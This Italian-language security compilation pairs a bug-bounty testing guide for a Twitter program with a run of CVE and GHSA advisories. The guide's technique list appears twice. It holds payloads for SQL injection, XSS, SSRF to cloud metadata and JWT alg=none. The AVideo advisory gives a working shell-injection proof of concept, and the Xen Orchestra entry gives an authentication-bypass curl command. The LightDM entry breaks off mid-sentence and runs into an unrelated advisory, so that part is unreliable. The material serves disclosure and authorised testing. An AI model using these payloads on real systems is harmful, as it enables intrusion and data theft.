titolo: twitter Vulnerability Disclosure Program
descrizione: twitter public bug bounty program

scope: App mobile su Google Play / App Store
outOfScope: Attacchi DDoS / volumetrici
Social engineering su dipendenti
Test su ambienti di produzione con dati reali di utenti
Spam o invio massivo di contenuti
Vulnerabilità in browser di terze parti (es. Chrome bugs)
Rate limiting issues senza impatto reale
Self-XSS (richiede azione della vittima)
Vulnerabilità che richiedono accesso fisico al device
Clickjacking su pagine senza azioni sensibili
Best practice senza impatto dimostrabile
Username/email enumeration su form pubblici
CSRF su endpoint non state-changing
Vulnerabilità già note pubblicamente senza PoC aggiuntivo
Problemi di SPF/DKIM/DMARC
Mixed content warnings su pagine non autenticabili

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su twitter
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
💡 Network: Discord Bugcrowd, NahamSec, InsiderPhD, STÖK

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

testingTechniques.name: API Endpoint Discovery
testingTechniques.description: Mappa tutti gli endpoint API, parametri e metodi accettati
steps: Intercetta traffico con Burp Suite o OWASP ZAP
Usa kiterunner o wordlists API comuni
Testa metodi HTTP alternativi: PUT, DELETE, PATCH, OPTIONS
Verifica GraphQL introspection se presente
Leggi documentazione API pubblica su /docs, /swagger

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

titolo: CVE-2026-120287: Allocation of Resources Without Limits or Throttling vulnerability in Plug.Parsers.MULTIPART in elix...
descrizione:
Allocation of Resources Without Limits or Throttling vulnerability in Plug.Parsers.MULTIPART in elixir-plug plug allows an unauthenticated remote attacker to exhaust memory via a multipart request body built from parts without headers, or from header lines without a name and a value. The parser charges the :length limit only with the name and value bytes of each part header and the bytes of each part body. The part delimiter, the header separator, and the line endings cost nothing.

In lib/plug/parsers/multipart.ex, Plug.Parsers.MULTIPART.parse_multipart_headers/5 keeps an entry for every part without a content-disposition header, together with its header list, until the whole body is read. A request made of such parts does not reach the limit at any size, and the parser process holds a multiple of the request size in memory until parsing completes. Any endpoint that uses Plug.Parsers with the :multipart parser is reachable.

This issue affects plug: from 1.13.0 before 1.20.4.

titolo:
CVE-2026-129246: Due to a Debian-specific patch, the directory used to share data between the
LightDM and the users l...
descrizione:
Due to a Debian-specific patch, the directory used to share data between the
LightDM and the users logging in was writable by the lightdm user of the
unprivileged greeter process. A process running under the lightdm identity
could leverage write access to that directory to force the LightDM process
(running as root) to change ownership and permissions on other root-owned

In apps/nestjs-backend/src/features/attachments/plugins/local.ts, LocalStorage.presigned uses the client-controlled hash as the storage filename, and LocalStorage.save resolves that path and copies the uploaded request body without calling assertPathWithinStorage on the write path. The read path uses the jail, but the write path does not, allowing the resolved destination to escape the configured storage directory. Because the backend container runs as uid 0, the attacker can write or overwrite arbitrary root-owned files, which can corrupt the instance or lead to root code execution. Object-storage deployments that do not use LocalStorage.save are not affected by this sink. This issue is fixed in release.2026-07-21T11-27-40Z.2320.

titolo: CVE-2026-110782: The SimpleSAMLphp SAML2 library is a PHP library for SAML2 related functionality. From 6.2.2 until 6...
descrizione: The SimpleSAMLphp SAML2 library is a PHP library for SAML2 related functionality. From 6.2.2 until 6.2.4 and 7.0.0-rc2, HTTPArtifact::receive() in src/Binding/HTTPArtifact.php verifies a signed outer ArtifactResponse but returns an unsigned embedded SAML Response before calling verifyMessageSignature(). The signed path verifies with the artifact issuer's metadata keys without requiring the embedded Response issuer to match that artifact issuer. In a multi-IdP federation, an attacker controlling one trusted IdP can therefore return a validly signed outer ArtifactResponse containing an unsigned Response that claims a different IdP, bypassing the binding's embedded-message authentication. End-to-end impersonation requires a service provider using HTTP-Artifact and a downstream consumer that relies on the binding to authenticate the embedded Response rather than independently requiring a signature. This issue is fixed in versions 6.2.4 and 7.0.0-rc2.

titolo: CVE-2026-21592: This High severity Path Traversal (Arbitrary Read/Write) vulnerability known as CVE-2026-21592 was i...
descrizione:
This High severity Path Traversal (Arbitrary Read/Write) vulnerability known as CVE-2026-21592 was introduced in version 4.9.0.

This Path Traversal (Arbitrary Read/Write) vulnerability, with a CVSS Score of 7.7 and a CVSS Vector of CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P allows an unauthenticated attacker to disclose protected application configuration files, which has high impact to confidentiality, no impact to integrity, no impact to availability, and requires no user interaction.

Atlassian recommends that Crucible Server customers upgrade to the latest version. If you are unable to do so, upgrade your instance to the specified supported fixed version:
 Crucible Server 4.9: Upgrade to a release greater than or equal to 4.9.16

See the Crucible Server release notes ([https://confluence.atlassian.com/crucible/crucible-releases-298977378.html]). You can download the latest version of Crucible from the Crucible Download Archives ([https://www.atlassian.com/software/crucible/download-archives]).

The following description summarizes the vulnerability reported via our Penetration Testing program:

Crucible do not account for path parameters when validating protected paths requested through the static-resource route. A crafted path segment passes validation, after which Jetty removes the path parameter during dispatch and resolves the request to a protected resource. This can expose files under WEB-INF and permit direct invocation of admin-area JSPs outside the normal interceptor and administrative password checks. An ordinary authenticated user can exploit the issue, and unauthenticated exploitation is possible when anonymous access is enabled.

titolo: GHSA-j44m-77cc-p3cc: AVideo API vulnerable to OS command injection through an unescaped FFmpeg process keyword
descrizione:
### Summary

The helper `listFFmpegProcesses($keyword)` in `plugin/API/standAlone/functions.php` builds a shell pipeline by interpolating `$keyword` inside single quotes and running it with `exec()`:

```php
$command .= " | grep '$keyword'";
exec($command, $output, $status);
```

The two callers in `plugin/API/standAlone/ffmpeg.json.php` (the `list` mode and the `isKeywordRunning` mode) pass the RAW decrypted `codeToExec` field, not the sanitized `$keyword` variable that the endpoint allowlists elsewhere. Because the value is placed inside a single-quoted shell context with no escaping, a payload that closes the quote (for example `x'; touch /tmp/marker #`) breaks out and injects an arbitrary command that runs via `exec()`'s `/bin/sh -c`. An attacker who can craft a valid encrypted payload achieves OS command execution as the web-server user.

### Vulnerable code

Sink — `plugin/API/standAlone/functions.php`, `listFFmpegProcesses()` (around lines 139-147):

```php
function listFFmpegProcesses($keyword = '')
{
    $command = "ps -eo pid,etime,%cpu,%mem,cmd | grep '[f]fmpeg'";

    if (!empty($keyword)) {
        $command .= " | grep '$keyword'";   // $keyword interpolated inside single quotes, unescaped
    }

    exec($command, $output, $status);       // runs via /bin/sh -c
```

Callers — `plugin/API/standAlone/ffmpeg.json.php` pass the RAW decrypted field, bypassing the allowlisting applied to the local `$keyword` variable. That local variable is built at line ~136 as `$keyword = preg_replace('/[^a-zA-Z0-9_-]/', '', $codeToExec->keyword)`, but the two callers below never use it:

```php
// list mode (line ~221)
$list = listFFmpegProcesses($codeToExec->keyword);

// isKeywordRunning mode (line ~341)
$list = listFFmpegProcesses($codeToExec->isKeywordRunning);
```

Neither mode is gated by the `$isStandAlone` check that guards the `deleteFolder` / `deleteFile` modes, so both run on any AVideo instance.

### Reachability

Reached by sending a `codeToExec` payload with either `list = 1` and a malicious `keyword`, or with a malicious `isKeywordRunning` value. Both modes call `listFFmpegProcesses()` with the raw field before any allowlist is applied to it.

### Privilege required

Same trust boundary as the parent command-injection fix in this endpoint: an attacker who can craft a valid encrypted `codeToExec` payload with a valid `APISecret`. `_decryptString()` calls the platform `decryptString` API (AES-256-CBC; key = `hash('sha256', $global['saltV2'])`, iv = `substr(hash('sha256', $global['systemRootPath']), 0, 16)`), and the payload is accepted when `payload->time` is within the last 30 seconds. No interactive login is required.

### Reproduction (end-to-end, against master HEAD)

Deployed the master HEAD source (commit `8eaca9d5`, dated 2026-06-30) in a PHP 8.2 / Apache container backed by MySQL 8.0, ran the genuine platform installer, enabled the API plugin, and confirmed the `decryptString` / `isAPISecretValid` platform APIs live over HTTP. `APISecret` is `md5($global['salt'] . $global['systemRootPath'] . 'API')`.

A `codeToExec` was encrypted (`encryptString()`) with:
- `time` = now
- `list` = 1
- `keyword` = `x'; touch /tmp/avideo_kw_rce_1782909694_20509 #`

POST:

```
curl -s -X POST "http://<host>/plugin/API/standAlone/ffmpeg.json.php" \
  --data-urlencode "APISecret=<APISecret>" \
  --data-urlencode "codeToExecEncrypted=<encrypted codeToExec>"
```

Verbatim response (normal list output while the injection ran as a side effect):

```
{"error":false,"msg":"","list":[]}
```

The injected `touch` ran (marker created by the web-server user):

```
-rw-r--r-- 1 www-data www-data 0 Jul  1 12:41 /tmp/avideo_kw_rce_1782909694_20509
```

Same result through the `isKeywordRunning` mode (payload `x'; touch /tmp/avideo_ikr_rce_1782909715_3303 #`):

```
{"error":true,"msg":"No FFmpeg process found with the given keyword","isRunning":false,"keyword":"x'; touch /tmp/avideo_ikr_rce_1782909715_3303 #"}
-rw-r--r-- 1 www-data www-data 0 Jul  1 12:41 /tmp/avideo_ikr_rce_1782909715_3303
```

Negative control (benign alphanumeric keyword `benignkw123`, `list` mode): same code path, marker NOT created:

```
{"error":false,"msg":"","list":[]}
ls: cannot access '/tmp/avideo_kwneg_1782909713_28529': No such file or directory
```

Patched re-run (after applying `escapeshellarg()` as below): the injection is neutralized and the marker is NOT created:

```
{"error":false,"msg":"","list":[]}
ls: cannot access '/tmp/avideo_kw_rce_PATCHED_1782909782_8294': No such file or directory
```

### Impact

Arbitrary OS command execution on the AVideo host as the web-server user (the account that owns the application files, configuration, database credentials, and `saltV2`). An attacker can read and modify site data, pivot to the database, and persist. This is a distinct sink (the `grep` single-quote breakout in `listFFmpegProcesses`) from the completion-hook concatenation elsewhere in the same endpoint, and it is reachable through two different modes.

### Suggested fix

Escape the keyword at the shell boundary in `listFFmpegProcesses()`:

```php
if (!empty($keyword)) {
    $command .= " | grep " . escapeshellarg($keyword);
}
```

Alternatively, have the `list` / `isKeywordRunning` callers pass the already-allowlisted `$keyword` value instead of the raw decrypted field. Escaping inside `listFFmpegProcesses()` is preferred because it protects every caller.

### Credit

Reported by tonghuaroot.

titolo: GHSA-9x82-4j54-863h: isomorphic-git allows unbounded memory allocation from attacker-controlled delta target size (DoS)
descrizione:
### Summary
When applying a delta object from a packfile, isomorphic-git reads a **server-controlled** `targetSize` and calls `Buffer.alloc(targetSize)` with no upper bound. A single malicious HTTP response to `git.clone()`/`git.fetch()` can force a ~2 GB allocation → memory exhaustion / DoS (process killed on memory-constrained hosts).

### Details
`src/utils/applyDelta.js`:

```js
const sourceSize = readVarIntLE(reader)
const targetSize = readVarIntLE(reader)   // attacker-controlled
…
target = Buffer.alloc(targetSize)
```

A pack with one `OBJ_REF_DELTA` whose header declares `targetSize = 0x7FFFFFFF` (~2 GB) and a 1-byte op causes the full allocation up front. The subsequent size-mismatch error is swallowed in `GitPackIndex.fromPack`, so on a host with spare RAM it silently wastes ~2 GB; on a small host the OS `SIGKILL`s the process.

#### Canonical git behavior (divergence)
git rejects the same 78-byte pack in ~96 ms — `error: delta replay has gone wild` / `fatal: … failed to apply delta` — with no large allocation and no hang (it bounds delta replay against the declared size rather than trusting it).

### PoC
`https://github.com/spiceoverflow/av4-oom` — open in a Codespace; a single clone/fetch against the bundled server, run under `--max-old-space-size=256`:

```
[AV-4] *** OOM ALLOCATION CONFIRMED — Buffer.alloc(targetSize) RAN ***
[AV-4] External (Buffer) memory rose by 2048 MB during clone.
```

(The allocation is off-heap, so a Node heap cap does not mitigate it.)

### Impact
A denial of service via unbounded memory allocation: a single response from a malicious or MitM'd server to `git.clone()`/`git.fetch()` forces a multi-gigabyte allocation, crashing the process on memory-constrained hosts.

Any application or service that clones or fetches from untrusted/compromised remotes with isomorphic-git — most acutely containers, serverless functions, and small VMs, where the OS OOM-kills the process.

### Suggested fix
Don't pre-allocate the untrusted `targetSize`: build the result from the actual delta ops and validate the total against `targetSize` before concatenating (and/or cap it against the advertised pack size).

titolo: GHSA-2v9w-34q6-wpqx: jline3 leads to ReDoS in Built-in Less Viewer Search
descrizione:
### Summary

The JLine3 built-in `less` pager compiles user-supplied search patterns directly as
Java regular expressions with no sanitization, timeout, or backtracking bound. A
malicious pattern such as `(a+)+b` can trigger catastrophic backtracking and hang the
session thread at 100% CPU. In deployments that expose `less` over Telnet or SSH,
this becomes a denial-of-service issue for the affected session and can be used to
exhaust a bounded session pool.

### Details

`Less.getPattern()` in `builtins/src/main/java/org/jline/builtins/Less.java` compiles
the user-controlled search string directly with `Pattern.compile()`:

```java
private Pattern getPattern(boolean doDisplayPattern) {
    Pattern compiled = null;
    String _pattern = doDisplayPattern ? displayPattern : pattern;
    if (_pattern != null) {
        boolean insensitive =
                ignoreCaseAlways || ignoreCaseCond && _pattern.toLowerCase().equals(_pattern);
        compiled = Pattern.compile(
                "(" + _pattern + ")", insensitive ? Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE : 0);
    }
    return compiled;
}
```

The resulting pattern is then applied repeatedly against file content with
`compiled.matcher(line).find()` in the `less` search path. Because Java's
`java.util.regex` engine is backtracking-based and has no built-in timeout, patterns
with nested quantifiers can take exponential time on non-matching input.

Affected source locations:
- `builtins/src/main/java/org/jline/builtins/Less.java`
- `getPattern(boolean doDisplayPattern)`
- search callers using `compiled.matcher(line).find()`

### PoC

1. Create a file with a long run of `a` characters:

```sh
printf 'aaaaaaaaaaaaaaaaaaaaaaaaa\n' > /tmp/testfile.txt
```

2. Open the file with the JLine3 `less` viewer.
3. Press `/` to enter search mode.
4. Enter the pattern `(a+)+b` and press Enter.

Expected result:
- The `less` session stops responding.
- The session thread consumes high CPU.

Variation:
- The same behavior can be triggered through the display-filter path using `&` because
  that path also compiles user input as a raw Java regex.

Reproduction environment:
- JLine3 on x86_64 Linux
- OpenJDK 25.0.2

### Impact

This is a denial-of-service vulnerability caused by catastrophic regex backtracking.
Any application embedding `org.jline:jline-builtins` and exposing the `less` viewer
is impacted. In local use, the affected user can hang their own session. In multi-user
Telnet or SSH deployments, one attacker can occupy one session thread indefinitely and
multiple attackers or sessions can exhaust the server's available worker pool.

### Suggested Fix

The preferred fix for the current git head is to move user-controlled regex matching
to a linear-time engine such as RE2/J.

Suggested patch:

```diff
diff --git a/builtins/pom.xml b/builtins/pom.xml
--- a/builtins/pom.xml
+++ b/builtins/pom.xml
@@
         <dependency>
+            <groupId>com.google.re2j</groupId>
+            <artifactId>re2j</artifactId>
+            <version>1.8</version>
+        </dependency>
+        <dependency>
             <groupId>org.jline</groupId>
             <artifactId>jline-reader</artifactId>
         </dependency>

diff --git a/builtins/src/main/java/org/jline/builtins/Less.java b/builtins/src/main/java/org/jline/builtins/Less.java
--- a/builtins/src/main/java/org/jline/builtins/Less.java
+++ b/builtins/src/main/java/org/jline/builtins/Less.java
@@
-import java.util.regex.Pattern;
+import com.google.re2j.Pattern;
@@
         if (_pattern != null) {
             boolean insensitive =
                     ignoreCaseAlways || ignoreCaseCond && _pattern.toLowerCase().equals(_pattern);
             compiled = Pattern.compile(
                     "(" + _pattern + ")",
                     insensitive ? Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE : 0);
         }
```

If introducing RE2/J is not acceptable, a weaker fallback is to perform regex matching
in a worker with a strict timeout and reject patterns that exceed the time budget.

### Credits

This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.

titolo: GHSA-vp2j-gqfm-r3cf: secp256k1-native has a compiler-induced timing side channel in scalar multiplication
descrizione:
## Summary

`Point#mul` — the default, constant-time scalar multiplication and the library's headline secret-scalar operation — could leak timing information about the secret scalar (a private key or ECDSA-style nonce in a downstream consumer) **not because of a source-level bug, but because the compiler reconstructed a branch from branchless source.**

The Montgomery ladder selects between point candidates with `uint256_select`, written deliberately branchlessly as `r = (a & ~mask) | (b & mask)` with a mask that is all-ones or all-zeros. GCC 15.2 at `-O2` recognises this select idiom, reconstructs the original boolean condition, and emits a secret-dependent conditional jump (`je`/`jne`). The branch's taken/not-taken timing correlates with the secret scalar bits flowing through the ladder.

This silently undid the 0.17.0 fix for the historical |t|=875 infinity-branch leak, which had relied on `uint256_select` compiling to branchless code.

## Impact

A timing side-channel on the secret scalar in constant-time scalar multiplication. For a consumer that calls `Point#mul` (or the native `scalar_multiply_ct`) on a secret key or nonce and exposes timing to an attacker (e.g. an online signing oracle), repeated measurements can statistically recover scalar bits — the classic ECC private-key/nonce timing-attack setting (cf. Brumley–Boneh). The leak is in the *compiled binary*; the source is correct, so source review and the deterministic ctgrind check on a *non-reconstructing* toolchain do not reveal it.

Pre-1.0 with no published RubyGems dependents, so this is handled as fix-publish-and-document: full GHSA + CVE record without a coordinated downstream-notification timeline. The CVE is filed for citability so the empirical record (paper → review → compiler regression → fix) is permanent and searchable.

## Affected configurations

The defect is a property of the (source, compiler, flags) triple, not the source alone:

- **Source:** any pre-`0.18.0` build. The branchless `uint256_select` was introduced with the 0.17.0 `jp_add_internal` |t|=875 fix; the pre-0.17 versions on RubyGems (0.15, 0.16) had different CT issues which the 0.17.0 fix addressed, so the safest user guidance is "upgrade to 0.18.0 from any earlier version".
- **Compiler:** one that reconstructs the all-0s/all-1s select into a branch. Confirmed: **GCC 15.2.0, `-O2`**. The extension ships with `-O2` (`extconf.rb` appends it), so the shipped binary on this compiler is affected.
- **Not affected:** the pure-Ruby path (different code; separately not claimed constant-time), and toolchains that emit `cmov` or pure bitwise ops here (the original review's toolchain).

## Patch (v0.18.0)

Introduces a value barrier (libsecp256k1/BoringSSL pattern) and routes every constant-time select mask through it:

```c
static inline uint64_t ct_value_barrier_u64(uint64_t x) {
#if defined(__GNUC__) || defined(__clang__)
    __asm__ volatile("" : "+r"(x));
#endif
    return x;
}

static inline uint64_t ct_mask_u64(uint64_t flag) {
    return ct_value_barrier_u64(-(uint64_t)(flag != 0));
}
```

Applied to all nine mask-select sites: `uint256_select`; `fred`, `fadd`, `fsub`, `fneg`; `scalar_reduce`, `scalar_add`; the `jp_double` infinity select; and the ladder `cswap`. Only `uint256_select` actively branchified under GCC 15.2/`-O2`; the rest are hardened as defence-in-depth.

## Workarounds (for unpatched users)

- **Upgrade to v0.18.0** (recommended).
- Or: compile the extension at `-O0`/`-O1`, or with a compiler that does not reconstruct the select (verify with `objdump -dl`) — fragile, not recommended.
- Do not call `Point#mul` on secret scalars from a timing-observable context until patched.

## Verification (reproducible)

Reference machine: AMD Ryzen 9 9950X (Zen 5), microcode `0xb404023`, Ubuntu 26.04 / Linux 7.0.0-14, GCC 15.2.0; `systemd-detect-virt = none`; turbo off, `performance` governor (min=max), SMT off, harness pinned with `taskset -c <core>` under `chrt -f`.

- **Deterministic (ctgrind):** before — "Conditional jump or move depends on uninitialised value" at the `uint256_select` source lines via `jp_add_internal` → `scalar_multiply_ct_internal`. After — clean, exit 0.
- **Disassembly:** before — `je`/`jne` attributed to the select source lines under `objdump -dl`. After — none (0 conditional jumps / `cmov` at any select line).
- **Statistical (dudect, bare metal):** before — `scalar_multiply_ct_internal` |t| ≈ 21 (stable across runs). After — mean |t| = 0.68, max 1.57, 0/20 runs over the 4.5 threshold.
- **Functional:** `bundle exec rspec` → 416 examples, 0 failures.

## Lasting control

Bare-metal dudect is now a **required pre-tag release gate**, re-run whenever the known-good compiler version changes. The deterministic ctgrind check remains the primary CT evidence but runs against CI's compiler; only the statistical bare-metal run observes the timing of the binary that actually ships. **A constant-time source is not a constant-time binary.**

## Related

- In-repo advisory: [docs/advisories/0001-compiler-reconstructed-ct-branch.md](https://github.com/sgbett/secp256k1-native/blob/master/docs/advisories/0001-compiler-reconstructed-ct-branch.md)
- [docs/security.md — Empirical timing verification](https://github.com/sgbett/secp256k1-native/blob/master/docs/security.md#empirical-timing-verification)
- [docs/risks.md — What works against it](https://github.com/sgbett/secp256k1-native/blob/master/docs/risks.md#what-works-against-it)
- [docs/security-review-v1.md — Finding H-2](https://github.com/sgbett/secp256k1-native/blob/master/docs/security-review-v1.md)
- [docs/timing-verification-runbook.md](https://github.com/sgbett/secp256k1-native/blob/master/docs/timing-verification-runbook.md)

titolo: GHSA-2r3w-c2vx-fv5g: Xen Orchestra: Empty-object login token
descrizione:
### Summary

REST cookie parsing turns `authenticationToken=j:%7B%7D` into `{}`. REST authentication passes that object to the XO token provider without requiring a string. The token collection treats `{}` as an unfiltered lookup and returns its first token; the provider authenticates as that token's owner if it is unexpired. The authenticated `/rest/v0/users/me/authentication_tokens` route then returns reusable login token IDs.


### Details

1. In `packages/xo-server/src/api/session.mjs`, function  `signIn(credentials)` has **no `params` schema** (unlike the deprecated `signInWithToken`, which declares `token: { type: 'string' }`), so `credentials.token` can be any JSON value.
2. `packages/xo-server/src/xo-mixins/authentication.mjs`, token provider:
   ```js
   this.registerAuthenticationProvider(async ({ token: tokenId }, { ip } = {}) => {
     if (!tokenId) return          // {} is truthy → passes
     const token = await app.getAuthenticationToken(tokenId)
     ...
     return { bypassOtp: true, expiration: token.expiration, userId: token.user_id }
   ```
3. `getAuthenticationToken(properties)` explicitly accepts an object, and `_getAuthenticationToken(id, properties)` does `this._tokens.first(properties ?? id)`.
4. `Collection#first(properties)` -> `_get(properties)`; in `collection/redis.mjs`, `if (isEmpty(properties)) return redis.sMembers(prefix + '_ids')…` → **all tokens**. Non-empty objects on indexed fields (`user_id`, `client_id`) do an index lookup → token of the chosen user.
5. HTTP paths: `index.mjs` (`req.cookies.token` → `isValidAuthenticationToken`), `xo-mixins/rest-api.mjs` and `@xen-orchestra/rest-api` middleware (`cookies.authenticationToken ?? cookies.token` → `authenticateUser({ token })`). `cookie-parser` turns `j:`-prefixed cookie values into parsed JSON, so `authenticationToken=j:{}` yields `{}`.


### Proof of concept

The object cookie returned 200 with unexpired token IDs, and one ID worked on a fresh request as an admin account. The attacker does not choose which token the empty-object lookup returns. Authentication succeeds only if the token returned first is unexpired and belongs to an existing user; if it is expired or its user was deleted, the request fails without trying another token.

```bash
curl -b 'authenticationToken=j:{}' https://<ip>/rest/v0/users
```

### Impact

An adversary can bypass authentication and perform actions with 'Admin' privilege. Xen Orchestra compromise can lead to arbitrary code execution on managed pools and a full XCP-ng node takeover as root.

titolo: GHSA-mqwm-5m85-gmcv: Gradle causes failure to disable repositories exposing builds to malicious artifacts
descrizione:
### Impact

When resolving dependencies, Gradle searches repositories in declaration order. If it encounters connection errors, Gradle will disable the repository and fail dependency resolution. This is necessary for both reproducibility and security reasons to prevent dependencies from being resolved from other repositories without warning. 

In previous versions of Gradle, some exceptions were not treated as fatal errors and would not cause a repository to be disabled. If a build encountered one of these exceptions, Gradle would continue to the next repository in the list and potentially resolve dependencies from a different repository. 

#### Vulnerability caused by continuing after max retries on transient errors

An exception like [`NoHttpResponseException`](https://hc.apache.org/httpclient-legacy/exception-handling.html#org_apache_commons_httpclient_NoHttpResponseException) can indicate transient errors. If the errors persist after a maximum number of retries, Gradle would continue to the next repository. 

This behavior could allow an attacker to disrupt the service of a repository and leverage another repository to serve malicious artifacts. This attack requires the attacker to have control over a repository after the disrupted repository.

### Patches

Gradle has introduced a change in behavior in Gradle 9.3.0 and 8.14.4 to stop searching other repositories when encountering these errors. 

Upgrading to either version will protect you against the vulnerabilities described here.

### Workarounds

